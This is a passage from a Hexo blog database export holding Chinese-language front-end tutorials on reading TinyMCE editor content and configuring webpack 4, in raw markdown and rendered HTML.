\n````\nvar activeEditor = tinymce.activeEditor; \n\nvar editBody = activeEditor.getBody(); \n\nactiveEditor.selection.select(editBody); \n\nvar text = activeEditor.selection.getContent( { ‘format’ : ‘text’ } );\n````\n取到的 text 即为纯文本内容。// 一般不需要，因为如果只取纯文本，没必要用富文本编辑器","slug":"FrontEnd/Tinymce富文本编辑器","published":1,"updated":"2018-09-05T06:33:18.461Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxv70034zodv9ce9sor3","content":"<h2 id=\"富文本编辑器tinymce获取文本内容和设置文本内容\"><a href=\"#富文本编辑器tinymce获取文本内容和设置文本内容\" class=\"headerlink\" title=\"富文本编辑器tinymce获取文本内容和设置文本内容\"></a><a href=\"https://blog.csdn.net/u012679583/article/details/50505842\" target=\"_blank\" rel=\"noopener\">富文本编辑器tinymce获取文本内容和设置文本内容</a></h2><p>1、如果当前页面只有一个编辑器： </p>\n<p>获取内容：<code>tinyMCE.activeEditor.getContent()</code> </p>\n<p>设置内容：<code>tinyMCE.activeEditor.setContent(“需要设置的编辑器内容”)</code></p>\n<p>2、如果当前页面有多个编辑器（下面的“[0]”表示第一个编辑器，以此类推）： </p>\n<p>获取内容：<code>tinyMCE.editors[0].getContent()</code></p>\n<p>设置内容：<code>tinyMCE.editors[0].setContent(“需要设置的编辑器内容”)</code></p>\n<p>3、获取不带HTML标记的纯文本内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var activeEditor = tinymce.activeEditor; </span><br><span class=\"line\"></span><br><span class=\"line\">var editBody = activeEditor.getBody(); </span><br><span class=\"line\"></span><br><span class=\"line\">activeEditor.selection.select(editBody); </span><br><span class=\"line\"></span><br><span class=\"line\">var text = activeEditor.selection.getContent( &#123; ‘format’ : ‘text’ &#125; );</span><br></pre></td></tr></table></figure></p>\n<p>取到的 text 即为纯文本内容。// 一般不需要，因为如果只取纯文本，没必要用富文本编辑器</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"富文本编辑器tinymce获取文本内容和设置文本内容\"><a href=\"#富文本编辑器tinymce获取文本内容和设置文本内容\" class=\"headerlink\" title=\"富文本编辑器tinymce获取文本内容和设置文本内容\"></a><a href=\"https://blog.csdn.net/u012679583/article/details/50505842\" target=\"_blank\" rel=\"noopener\">富文本编辑器tinymce获取文本内容和设置文本内容</a></h2><p>1、如果当前页面只有一个编辑器： </p>\n<p>获取内容：<code>tinyMCE.activeEditor.getContent()</code> </p>\n<p>设置内容：<code>tinyMCE.activeEditor.setContent(“需要设置的编辑器内容”)</code></p>\n<p>2、如果当前页面有多个编辑器（下面的“[0]”表示第一个编辑器，以此类推）： </p>\n<p>获取内容：<code>tinyMCE.editors[0].getContent()</code></p>\n<p>设置内容：<code>tinyMCE.editors[0].setContent(“需要设置的编辑器内容”)</code></p>\n<p>3、获取不带HTML标记的纯文本内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var activeEditor = tinymce.activeEditor; </span><br><span class=\"line\"></span><br><span class=\"line\">var editBody = activeEditor.getBody(); </span><br><span class=\"line\"></span><br><span class=\"line\">activeEditor.selection.select(editBody); </span><br><span class=\"line\"></span><br><span class=\"line\">var text = activeEditor.selection.getContent( &#123; ‘format’ : ‘text’ &#125; );</span><br></pre></td></tr></table></figure></p>\n<p>取到的 text 即为纯文本内容。// 一般不需要，因为如果只取纯文本，没必要用富文本编辑器</p>\n"},{"title":"WebPack","date":"2018-07-26T00:59:44.000Z","_content":"## webpack详解\n[原文出处: WsmDyj](https://segmentfault.com/a/1190000015611030)  \n\nwebpack是一个`打包工具`，他的宗旨是`一切静态资源即可打包`。  \n有人就会问为什么要webpack？webpack是现代前端技术的基石，常规的开发方式，比如jquery,html,css静态网页开发已经落后了(也可以配合webpack技术开发)。现在是MVVM的时代，数据驱动界面。webpack将现代js开发中的各种新型有用的技术，集合打包。  \n\n**webpack生态圈:**\n![webpack生态圈](https://mmbiz.qpic.cn/mmbiz_jpg/zPh0erYjkib3EVfKmEFGibiaqqKlnWmGLMouXAfJQL0cWMtd2pZt67AeZDxjM3VZ3sbbUVccbqTPA6Pa6T2jvTafA/640)\n\n**webpack4.0的配置(实际上是`Node`干活)**\n````\nconst path = require('path'); //引入node的path模块\nconst webpack = require('webpack'); //引入webpack,使用lodash\nconst HtmlWebpackPlugin = require('html-webpack-plugin') //将html打包\nconst ExtractTextPlugin = require('extract-text-webpack-plugin') //打包的css拆分,将一部分抽离出来  \nconst CopyWebpackPlugin = require('copy-webpack-plugin')\n// console.log(path.resolve(__dirname,'dist')); // 物理地址拼接\nmodule.exports = {\n    entry: './src/index.js', //入口文件  在vue-cli main.js\n    output: { //webpack如何输出\n        path: path.resolve(__dirname, 'dist'), //定位，输出文件的目标路径\n        filename: '[name].js'\n    },\n    module: { //模块的相关配置\n        rules: [ //根据文件的后缀提供一个loader,解析规则\n            {\n                test: /\\.js$/, //es6 => es5\n                include: [\n                    path.resolve(__dirname, 'src')\n                ],\n                // exclude:[], 不匹配选项（优先级高于test和include）\n                use: 'babel-loader'\n            },\n            {\n                test: /\\.less$/,\n                use: ExtractTextPlugin.extract({\n                    fallback: 'style-loader',\n                    use: [\n                        'css-loader',\n                        'less-loader'\n                    ]\n                })\n            },\n            { //图片loader\n                test: /\\.(png|jpg|gif)$/,\n                use: [\n                    {\n                        loader: 'file-loader' //根据文件地址加载文件\n                    }\n                ]\n            }\n        ]\n    },\n    resolve: { // 解析模块的可选项  \n        // modules: [ ] // 模块的查找目录 配置其他的css等文件\n        extensions: [\".js\", \".json\", \".jsx\", \".less\", \".css\"], //用到文件的扩展名\n        alias: { //模快别名列表\n            utils: path.resolve(__dirname, 'src/utils')\n        }\n    },\n    plugins: [ // 插进的引用, 压缩，分离美化\n        new ExtractTextPlugin('[name].css'), // [name] 默认  也可以自定义name  声明使用\n        new HtmlWebpackPlugin({ // 将模板的头部和尾部添加css和js模板,dist 目录发布到服务器上，项目包。可以直接上线\n            file: 'index.html', // 打造单页面运用 最后运行的不是这个\n            template: 'src/index.html' // vue-cli放在根目录下\n        }),\n        new CopyWebpackPlugin([ // src下其他的文件直接复制到dist目录下\n            {\n                from: 'src/assets/favicon.ico',\n                to: 'favicon.ico'\n            }\n        ]),\n        new webpack.ProvidePlugin({ //引用框架 jquery  lodash工具库是很多组件会复用的，省去了import\n            '_': 'lodash' //引用webpack\n        })\n    ],\n    devServer: { //服务于webpack-dev-server  内部封装了一个express\n        port: '8080',\n        before(app) {\n            app.get('/api/test.json', (req, res) => {\n                res.json({\n                    code: 200,\n                    message: 'Hello World'\n                })\n            })\n        }\n    }\n}\n````\n\n## <span style=\"color:red\">一、前端环境搭建</span>\n使用 `npm` 或 `yarn` 来安装 `webpack`\n````\nnpm install `webpack` `webpack-cli` -g \n# 或者 || \nyarn global add `webpack` `webpack-cli`\n````\n\n为什么`webpack`分为`两个文件`呢？  \n在`webpack3`中，webpack本身和它的cli以前都是在同一个包中;  \n但在第4版中，他们已经将两者分开来更好地管理它们。\n\n新建一个`webpack的文件夹`，在其下新建一个`try-webpack` ( 防止`init`时项目名和安装包同名 ) 并初始化和配置webpack。\n\n> npm init -y  // -y 默认所有的配置\n\n> yarn add webpack webpack-cli -D // -D webpack安装在devDependencies环境中\n\n## <span style=\"color:red\">二、部署webpack</span>\n在上面搭建好的环境项目中，我们来到`package.json`里配置我们的`scripts`,让webpack\n````\n{\n    \"scripts\": {\n        \"build\": \"webpack --mode production\" //我们在这里配置，就可以使用npm run build 启动我们的webpack\n    },\n    \"devDependencies\": {\n        \"webpack\": \"^4.16.0\",\n        \"webpack-cli\": \"^3.0.8\"\n    }\n}\n````\n配置好我们`webpack的运行环境`时，联想下`vue-cli`。  \n平时使用`vue-cli`会自动帮我们配置并生成项目。  \n我们在`src`下进行项目的开发，最后 `npm run build` 打包生成我们的dist的目录。  \n不知道你是否还记得，还是让我们进入下一节让我们感受下这其中的整个流程吧。\n\n## <span style=\"color:red\">三、npm run build 发生了什么</span>\n在我们的根项目下`try-webpack`新建一个`src`目录。在`src`目录下新建一个`index.js`文件。  \n在里面我们可以写任意的代码，以案例为主:\n> const a = 1;\n\n写完后, 在终端运行命令 `npm run build` ；会发现新增了一个`dist`目录，里面存放着webpack打包好的`main.js`文件。  \n这和我们在`vue-cli`里操作是一样的。\n\n## <span style=\"color:red\">四、webpackp配置流程篇</span>\n我们在开发是一般会打包src下的什么文件呢？我们可以回忆一下，其实vue-cli项目src下不就这几点嘛：\n\n+ 发布时需要的html，css，js\n+ css预编译器stylus，less，sass\n+ es6的高级语法\n+ 图片资源.png，.gif，.ico，.jpg\n+ 文件间的require\n+ 别名@等修饰符\n\n分几点来讲解webpack中`webpack.config.js`的配置，跟着脚步，一步一步的来完成我们的流程线。\n\n### **✍️Html在webpack中的配置**\n\n在项目的根目录`try-webpack`下新建`webpack.config.js`文件，以`commonJS`模块化机制向外输出,并且新建一个`index.html`。\n> module.exports = { }\n\n配置我们的入口`entry`，在`vue-cli`里相当于根目录下的`main.js`，我们的出口`output`。  \n我们可以把`webpack`理解为一个工厂，进入相当于把各种各样的原料放进我们的工厂了，然后工厂进行一系列的打包操作把打包好的东西，向外输出，然后就可以去出售了(上线)。\n````\nconst path = require('path'); // 引入我们的node模块里的path\n// 测试下 console.log(path.resolve(__dirname,'dist')); // 物理地址拼接\nmodule.exports = {\n    entry: './src/index.js', // 入口文件  在vue-cli main.js\n    output: { // webpack如何向外输出\n        path: path.resolve(__dirname, 'dist'), // 定位，输出文件的目标路径\n        filename: '[name].js' // 文件名[name].js默认，也可自行配置\n    },\n}\n````\n**HTML打包** 需要 **安装/引入** `html-webpack-plugin`\n> yarn add html-webpack-plugin -D // 在开发环境中安装\n\n> const HtmlWebpackPlugin = require('html-webpack-plugin')  //引入打包我们的HTML\n\n在module.exports里配置我们的plugins(插件):\n````\nplugins: [  //插进的引用, 压缩，分离美化\n    new HtmlWebpackPlugin({  // 将模板的头部和尾部添加css和js模板, dist 目录发布到服务器上，项目包。可以直接上线\n        file: 'index.html', // 打造单页面运用 最后运行的不是这个\n        template: 'src/index.html'  // vue-cli放在跟目录下\n    }),\n],\n````\n配置好后，在终端输入`npm run dev`后webpack将我们的html打包好并且`自动将js引进`来。\n````\n<body>\n    <p class=\"main\">Hello World</p>\n    <script type=\"text/javascript\" src=\"main.js\"></script>\n</body>\n````\n`live-sever` 我们的dist目录，启动一个`8080端口`，我们就可以看到我们的Hello World了。这就是我们上线版的页面。\n\n### **css在webpack中的配置**\n在`vue-cli`里，我们可以使用css去写我们的样式，也可以使用高级`stylus，less，sass`等预编译器。这里就以less为例，看看webpack怎么将他打包成一个css。\n````\n.main {\n  color: red;\n}\n````\n在`src目录`下新建我们的`style.less`文件，在配置之前我们需要`npm安装`我们的`css-loader`和`sass-loader`， `sass、less`\n> yarn add css-loader less less-loader style-loader -D\n\n执行完上述命令我们在 `packge.json` 里可以看到我们的配置文件\n````\n\"devDependencies\": {\n\n    \"css-loader\": \"^1.0.0\",\n\n    \"html-webpack-plugin\": \"^3.2.0\",\n\n    \"sass\": \"^1.9.0\",\n\n    \"sass-loader\": \"^7.0.3\",\n\n    \"webpack\": \"^4.16.0\",\n\n    \"webpack-cli\": \"^3.0.8\"\n\n}\n````\n安装好后，开始配置`webpack.config.js`文件。  \n这里申明一下，css 在 dist 目录下 需要和 `HTML`分离，还需引入`extract-text-webpack-plugin`，先安装\n> yarn add extract-text-webpack-plugin -D\n\n> npm install extract-text-webpack-plugin -D\n\n这里有一个坑，`extract-text-webpack-plugin`在`4.0并不支持`这样的安装，可自行chrome。  \n换一种方式,选择`4.00-beta.0版本`\n> yarn add extract-text-webpack-plugin@last -D\n\n来到我们的`module.exports`里，完成moudel的配置\n\n---\n[阅读原文](https://mp.weixin.qq.com/s/kZ9Y99yO5_CmUzKjP_M4Nw)\n\n","source":"_posts/FrontEnd/WebPack.md","raw":"---\ntitle: WebPack\ndate: 2018-07-26 08:59:44\ntags: WebPack配置\ncategories: WebPack\n---\n## webpack详解\n[原文出处: WsmDyj](https://segmentfault.com/a/1190000015611030)  \n\nwebpack是一个`打包工具`，他的宗旨是`一切静态资源即可打包`。  \n有人就会问为什么要webpack？webpack是现代前端技术的基石，常规的开发方式，比如jquery,html,css静态网页开发已经落后了(也可以配合webpack技术开发)。现在是MVVM的时代，数据驱动界面。webpack将现代js开发中的各种新型有用的技术，集合打包。  \n\n**webpack生态圈:**\n![webpack生态圈](https://mmbiz.qpic.cn/mmbiz_jpg/zPh0erYjkib3EVfKmEFGibiaqqKlnWmGLMouXAfJQL0cWMtd2pZt67AeZDxjM3VZ3sbbUVccbqTPA6Pa6T2jvTafA/640)\n\n**webpack4.0的配置(实际上是`Node`干活)**\n````\nconst path = require('path'); //引入node的path模块\nconst webpack = require('webpack'); //引入webpack,使用lodash\nconst HtmlWebpackPlugin = require('html-webpack-plugin') //将html打包\nconst ExtractTextPlugin = require('extract-text-webpack-plugin') //打包的css拆分,将一部分抽离出来  \nconst CopyWebpackPlugin = require('copy-webpack-plugin')\n// console.log(path.resolve(__dirname,'dist')); // 物理地址拼接\nmodule.exports = {\n    entry: './src/index.js', //入口文件  在vue-cli main.js\n    output: { //webpack如何输出\n        path: path.resolve(__dirname, 'dist'), //定位，输出文件的目标路径\n        filename: '[name].js'\n    },\n    module: { //模块的相关配置\n        rules: [ //根据文件的后缀提供一个loader,解析规则\n            {\n                test: /\\.js$/, //es6 => es5\n                include: [\n                    path.resolve(__dirname, 'src')\n                ],\n                // exclude:[], 不匹配选项（优先级高于test和include）\n                use: 'babel-loader'\n            },\n            {\n                test: /\\.less$/,\n                use: ExtractTextPlugin.extract({\n                    fallback: 'style-loader',\n                    use: [\n                        'css-loader',\n                        'less-loader'\n                    ]\n                })\n            },\n            { //图片loader\n                test: /\\.(png|jpg|gif)$/,\n                use: [\n                    {\n                        loader: 'file-loader' //根据文件地址加载文件\n                    }\n                ]\n            }\n        ]\n    },\n    resolve: { // 解析模块的可选项  \n        // modules: [ ] // 模块的查找目录 配置其他的css等文件\n        extensions: [\".js\", \".json\", \".jsx\", \".less\", \".css\"], //用到文件的扩展名\n        alias: { //模快别名列表\n            utils: path.resolve(__dirname, 'src/utils')\n        }\n    },\n    plugins: [ // 插进的引用, 压缩，分离美化\n        new ExtractTextPlugin('[name].css'), // [name] 默认  也可以自定义name  声明使用\n        new HtmlWebpackPlugin({ // 将模板的头部和尾部添加css和js模板,dist 目录发布到服务器上，项目包。可以直接上线\n            file: 'index.html', // 打造单页面运用 最后运行的不是这个\n            template: 'src/index.html' // vue-cli放在根目录下\n        }),\n        new CopyWebpackPlugin([ // src下其他的文件直接复制到dist目录下\n            {\n                from: 'src/assets/favicon.ico',\n                to: 'favicon.ico'\n            }\n        ]),\n        new webpack.ProvidePlugin({ //引用框架 jquery  lodash工具库是很多组件会复用的，省去了import\n            '_': 'lodash' //引用webpack\n        })\n    ],\n    devServer: { //服务于webpack-dev-server  内部封装了一个express\n        port: '8080',\n        before(app) {\n            app.get('/api/test.json', (req, res) => {\n                res.json({\n                    code: 200,\n                    message: 'Hello World'\n                })\n            })\n        }\n    }\n}\n````\n\n## <span style=\"color:red\">一、前端环境搭建</span>\n使用 `npm` 或 `yarn` 来安装 `webpack`\n````\nnpm install `webpack` `webpack-cli` -g \n# 或者 || \nyarn global add `webpack` `webpack-cli`\n````\n\n为什么`webpack`分为`两个文件`呢？  \n在`webpack3`中，webpack本身和它的cli以前都是在同一个包中;  \n但在第4版中，他们已经将两者分开来更好地管理它们。\n\n新建一个`webpack的文件夹`，在其下新建一个`try-webpack` ( 防止`init`时项目名和安装包同名 ) 并初始化和配置webpack。\n\n> npm init -y  // -y 默认所有的配置\n\n> yarn add webpack webpack-cli -D // -D webpack安装在devDependencies环境中\n\n## <span style=\"color:red\">二、部署webpack</span>\n在上面搭建好的环境项目中，我们来到`package.json`里配置我们的`scripts`,让webpack\n````\n{\n    \"scripts\": {\n        \"build\": \"webpack --mode production\" //我们在这里配置，就可以使用npm run build 启动我们的webpack\n    },\n    \"devDependencies\": {\n        \"webpack\": \"^4.16.0\",\n        \"webpack-cli\": \"^3.0.8\"\n    }\n}\n````\n配置好我们`webpack的运行环境`时，联想下`vue-cli`。  \n平时使用`vue-cli`会自动帮我们配置并生成项目。  \n我们在`src`下进行项目的开发，最后 `npm run build` 打包生成我们的dist的目录。  \n不知道你是否还记得，还是让我们进入下一节让我们感受下这其中的整个流程吧。\n\n## <span style=\"color:red\">三、npm run build 发生了什么</span>\n在我们的根项目下`try-webpack`新建一个`src`目录。在`src`目录下新建一个`index.js`文件。  \n在里面我们可以写任意的代码，以案例为主:\n> const a = 1;\n\n写完后, 在终端运行命令 `npm run build` ；会发现新增了一个`dist`目录，里面存放着webpack打包好的`main.js`文件。  \n这和我们在`vue-cli`里操作是一样的。\n\n## <span style=\"color:red\">四、webpackp配置流程篇</span>\n我们在开发是一般会打包src下的什么文件呢？我们可以回忆一下，其实vue-cli项目src下不就这几点嘛：\n\n+ 发布时需要的html，css，js\n+ css预编译器stylus，less，sass\n+ es6的高级语法\n+ 图片资源.png，.gif，.ico，.jpg\n+ 文件间的require\n+ 别名@等修饰符\n\n分几点来讲解webpack中`webpack.config.js`的配置，跟着脚步，一步一步的来完成我们的流程线。\n\n### **✍️Html在webpack中的配置**\n\n在项目的根目录`try-webpack`下新建`webpack.config.js`文件，以`commonJS`模块化机制向外输出,并且新建一个`index.html`。\n> module.exports = { }\n\n配置我们的入口`entry`，在`vue-cli`里相当于根目录下的`main.js`，我们的出口`output`。  \n我们可以把`webpack`理解为一个工厂，进入相当于把各种各样的原料放进我们的工厂了，然后工厂进行一系列的打包操作把打包好的东西，向外输出，然后就可以去出售了(上线)。\n````\nconst path = require('path'); // 引入我们的node模块里的path\n// 测试下 console.log(path.resolve(__dirname,'dist')); // 物理地址拼接\nmodule.exports = {\n    entry: './src/index.js', // 入口文件  在vue-cli main.js\n    output: { // webpack如何向外输出\n        path: path.resolve(__dirname, 'dist'), // 定位，输出文件的目标路径\n        filename: '[name].js' // 文件名[name].js默认，也可自行配置\n    },\n}\n````\n**HTML打包** 需要 **安装/引入** `html-webpack-plugin`\n> yarn add html-webpack-plugin -D // 在开发环境中安装\n\n> const HtmlWebpackPlugin = require('html-webpack-plugin')  //引入打包我们的HTML\n\n在module.exports里配置我们的plugins(插件):\n````\nplugins: [  //插进的引用, 压缩，分离美化\n    new HtmlWebpackPlugin({  // 将模板的头部和尾部添加css和js模板, dist 目录发布到服务器上，项目包。可以直接上线\n        file: 'index.html', // 打造单页面运用 最后运行的不是这个\n        template: 'src/index.html'  // vue-cli放在跟目录下\n    }),\n],\n````\n配置好后，在终端输入`npm run dev`后webpack将我们的html打包好并且`自动将js引进`来。\n````\n<body>\n    <p class=\"main\">Hello World</p>\n    <script type=\"text/javascript\" src=\"main.js\"></script>\n</body>\n````\n`live-sever` 我们的dist目录，启动一个`8080端口`，我们就可以看到我们的Hello World了。这就是我们上线版的页面。\n\n### **css在webpack中的配置**\n在`vue-cli`里，我们可以使用css去写我们的样式，也可以使用高级`stylus，less，sass`等预编译器。这里就以less为例，看看webpack怎么将他打包成一个css。\n````\n.main {\n  color: red;\n}\n````\n在`src目录`下新建我们的`style.less`文件，在配置之前我们需要`npm安装`我们的`css-loader`和`sass-loader`， `sass、less`\n> yarn add css-loader less less-loader style-loader -D\n\n执行完上述命令我们在 `packge.json` 里可以看到我们的配置文件\n````\n\"devDependencies\": {\n\n    \"css-loader\": \"^1.0.0\",\n\n    \"html-webpack-plugin\": \"^3.2.0\",\n\n    \"sass\": \"^1.9.0\",\n\n    \"sass-loader\": \"^7.0.3\",\n\n    \"webpack\": \"^4.16.0\",\n\n    \"webpack-cli\": \"^3.0.8\"\n\n}\n````\n安装好后，开始配置`webpack.config.js`文件。  \n这里申明一下，css 在 dist 目录下 需要和 `HTML`分离，还需引入`extract-text-webpack-plugin`，先安装\n> yarn add extract-text-webpack-plugin -D\n\n> npm install extract-text-webpack-plugin -D\n\n这里有一个坑，`extract-text-webpack-plugin`在`4.0并不支持`这样的安装，可自行chrome。  \n换一种方式,选择`4.00-beta.0版本`\n> yarn add extract-text-webpack-plugin@last -D\n\n来到我们的`module.exports`里，完成moudel的配置\n\n---\n[阅读原文](https://mp.weixin.qq.com/s/kZ9Y99yO5_CmUzKjP_M4Nw)\n\n","slug":"FrontEnd/WebPack","published":1,"updated":"2018-09-05T06:33:18.486Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxv90038zodvx3ixxwek","content":"<h2 id=\"webpack详解\"><a href=\"#webpack详解\" class=\"headerlink\" title=\"webpack详解\"></a>webpack详解</h2><p><a href=\"https://segmentfault.com/a/1190000015611030\" target=\"_blank\" rel=\"noopener\">原文出处: WsmDyj</a>  </p>\n<p>webpack是一个<code>打包工具</code>，他的宗旨是<code>一切静态资源即可打包</code>。<br>有人就会问为什么要webpack？webpack是现代前端技术的基石，常规的开发方式，比如jquery,html,css静态网页开发已经落后了(也可以配合webpack技术开发)。现在是MVVM的时代，数据驱动界面。webpack将现代js开发中的各种新型有用的技术，集合打包。  </p>\n<p><strong>webpack生态圈:</strong><br><img src=\"https://mmbiz.qpic.cn/mmbiz_jpg/zPh0erYjkib3EVfKmEFGibiaqqKlnWmGLMouXAfJQL0cWMtd2pZt67AeZDxjM3VZ3sbbUVccbqTPA6Pa6T2jvTafA/640\" alt=\"webpack生态圈\"></p>\n<p><strong>webpack4.0的配置(实际上是<code>Node</code>干活)</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const path = require(&apos;path&apos;); //引入node的path模块</span><br><span class=\"line\">const webpack = require(&apos;webpack&apos;); //引入webpack,使用lodash</span><br><span class=\"line\">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;) //将html打包</span><br><span class=\"line\">const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;) //打包的css拆分,将一部分抽离出来  </span><br><span class=\"line\">const CopyWebpackPlugin = require(&apos;copy-webpack-plugin&apos;)</span><br><span class=\"line\">// console.log(path.resolve(__dirname,&apos;dist&apos;)); // 物理地址拼接</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    entry: &apos;./src/index.js&apos;, //入口文件  在vue-cli main.js</span><br><span class=\"line\">    output: &#123; //webpack如何输出</span><br><span class=\"line\">        path: path.resolve(__dirname, &apos;dist&apos;), //定位，输出文件的目标路径</span><br><span class=\"line\">        filename: &apos;[name].js&apos;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    module: &#123; //模块的相关配置</span><br><span class=\"line\">        rules: [ //根据文件的后缀提供一个loader,解析规则</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.js$/, //es6 =&gt; es5</span><br><span class=\"line\">                include: [</span><br><span class=\"line\">                    path.resolve(__dirname, &apos;src&apos;)</span><br><span class=\"line\">                ],</span><br><span class=\"line\">                // exclude:[], 不匹配选项（优先级高于test和include）</span><br><span class=\"line\">                use: &apos;babel-loader&apos;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.less$/,</span><br><span class=\"line\">                use: ExtractTextPlugin.extract(&#123;</span><br><span class=\"line\">                    fallback: &apos;style-loader&apos;,</span><br><span class=\"line\">                    use: [</span><br><span class=\"line\">                        &apos;css-loader&apos;,</span><br><span class=\"line\">                        &apos;less-loader&apos;</span><br><span class=\"line\">                    ]</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123; //图片loader</span><br><span class=\"line\">                test: /\\.(png|jpg|gif)$/,</span><br><span class=\"line\">                use: [</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        loader: &apos;file-loader&apos; //根据文件地址加载文件</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    resolve: &#123; // 解析模块的可选项  </span><br><span class=\"line\">        // modules: [ ] // 模块的查找目录 配置其他的css等文件</span><br><span class=\"line\">        extensions: [&quot;.js&quot;, &quot;.json&quot;, &quot;.jsx&quot;, &quot;.less&quot;, &quot;.css&quot;], //用到文件的扩展名</span><br><span class=\"line\">        alias: &#123; //模快别名列表</span><br><span class=\"line\">            utils: path.resolve(__dirname, &apos;src/utils&apos;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    plugins: [ // 插进的引用, 压缩，分离美化</span><br><span class=\"line\">        new ExtractTextPlugin(&apos;[name].css&apos;), // [name] 默认  也可以自定义name  声明使用</span><br><span class=\"line\">        new HtmlWebpackPlugin(&#123; // 将模板的头部和尾部添加css和js模板,dist 目录发布到服务器上，项目包。可以直接上线</span><br><span class=\"line\">            file: &apos;index.html&apos;, // 打造单页面运用 最后运行的不是这个</span><br><span class=\"line\">            template: &apos;src/index.html&apos; // vue-cli放在根目录下</span><br><span class=\"line\">        &#125;),</span><br><span class=\"line\">        new CopyWebpackPlugin([ // src下其他的文件直接复制到dist目录下</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                from: &apos;src/assets/favicon.ico&apos;,</span><br><span class=\"line\">                to: &apos;favicon.ico&apos;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]),</span><br><span class=\"line\">        new webpack.ProvidePlugin(&#123; //引用框架 jquery  lodash工具库是很多组件会复用的，省去了import</span><br><span class=\"line\">            &apos;_&apos;: &apos;lodash&apos; //引用webpack</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    devServer: &#123; //服务于webpack-dev-server  内部封装了一个express</span><br><span class=\"line\">        port: &apos;8080&apos;,</span><br><span class=\"line\">        before(app) &#123;</span><br><span class=\"line\">            app.get(&apos;/api/test.json&apos;, (req, res) =&gt; &#123;</span><br><span class=\"line\">                res.json(&#123;</span><br><span class=\"line\">                    code: 200,</span><br><span class=\"line\">                    message: &apos;Hello World&apos;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"一、前端环境搭建\"><a href=\"#一、前端环境搭建\" class=\"headerlink\" title=\"一、前端环境搭建\"></a><span style=\"color:red\">一、前端环境搭建</span></h2><p>使用 <code>npm</code> 或 <code>yarn</code> 来安装 <code>webpack</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install `webpack` `webpack-cli` -g </span><br><span class=\"line\"># 或者 || </span><br><span class=\"line\">yarn global add `webpack` 